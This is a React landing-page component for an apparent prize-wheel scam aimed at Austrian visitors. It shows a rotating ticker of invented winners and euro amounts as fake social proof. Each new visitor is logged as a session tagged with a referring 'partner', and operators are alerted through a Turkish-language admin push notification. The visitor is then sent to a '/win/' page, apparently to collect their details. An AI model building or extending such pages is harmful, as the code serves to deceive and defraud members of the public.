const WINNERS = [
  ["Markus H.","Wien","500 \u20ac"],
  ["Anna S.","Graz","1.500 \u20ac"],
  ["Thomas B.","Linz","1.000 \u20ac"],
  ["Julia K.","Salzburg","2.500 \u20ac"],
  ["Stefan M.","Innsbruck","500 \u20ac"],
  ["Lisa P.","Klagenfurt","2.000 \u20ac"],
  ["David R.","Villach","1.500 \u20ac"],
  ["Sarah T.","St. Poelten","1.000 \u20ac"],
];

export default function LandingShell() {
  useEffect(() => {
    const body = document.body;
    const de = document.documentElement;
    body.classList.add("landing-mode");
    try {
      de.style.setProperty("--custom-bg", "none", "important");
      de.style.setProperty("background-image", "none", "important");
      de.style.setProperty("background-color", "#ffffff", "important");
      body.style.setProperty("background-image", "none", "important");
      body.style.setProperty("background", "#ffffff", "important");
      body.style.setProperty("background-color", "#ffffff", "important");
    } catch {}

    (window as unknown as { goForm?: () => Promise<void> }).goForm = async () => {
      const s = new URLSearchParams(window.location.search);
      const existing = s.get("session");
      if (existing) {
        window.location.href = "/win/" + encodeURIComponent(existing);
        return;
      }
      try {
        const supabase = createBrowserSupabaseClient();
        if (supabase) {
          const partner = s.get("ref") || "admin";
          const { data } = await supabase
            .from("sessions")
            .insert({
              amount: 0,
              current_step: "win",
              status: "online",
              is_hidden: false,
              partner_name: partner,
              form_data: { currency: "€", is_wheel_game: true, pending_profile: true },
            })
            .select("id, public_id")
            .maybeSingle();
          if (data?.id) {
            try {
              void fetch("/api/push/notify", {
                method: "POST",
                headers: { "Content-Type": "application/json" },
                body: JSON.stringify({
                  title: "Yeni Ziyaretçi",
                  body: `${partner} üzerinden siteye giriş yapıldı`,
                  url: "/admin1",
                  tag: `session-${data.id}`,
                }),
              });
            } catch {}
            window.location.href =
              "/win/" + encodeURIComponent(data.public_id ? String(data.public_id) : data.id);
            return;
          }
        }
      } catch {}
      s.set("form", "1");
      window.location.search = s.toString();
    };

    const box = document.getElementById("winners");
    let wi = 0;
    const rot = () => {
      if (!box) return;
      const w = WINNERS[wi % WINNERS.length];
      wi++;
      box.innerHTML =
        '<div class="wrow"><span class="dot"></span><span><b>' + w[0] +
        "</b> aus " + w[1] + " hat soeben <b>" + w[2] + "</b> gewonnen!</span></div>";
    };
    rot();
    const iv = window.setInterval(rot, 3500);

    return () => {
      window.clearInterval(iv);
      body.classList.remove("landing-mode");
      try {
        de.style.removeProperty("--custom-bg");
        de.style.removeProperty("background-image");
        de.style.removeProperty("background-color");
        body.style.removeProperty("background-image");
        body.style.removeProperty("background");
        body.style.removeProperty("background-color");
      } catch {}
    };
  }, []);

  return (
    <div
      className="mm-landing fixed inset-0 z-10 overflow-y-auto"
      style={{ backgroundColor: "#ffffff" }}
    >
      <style>{LANDING_CSS}</style>
      <div dangerouslySetInnerHTML={{ __html: LANDING_HTML }} />
    </div>
  );
}
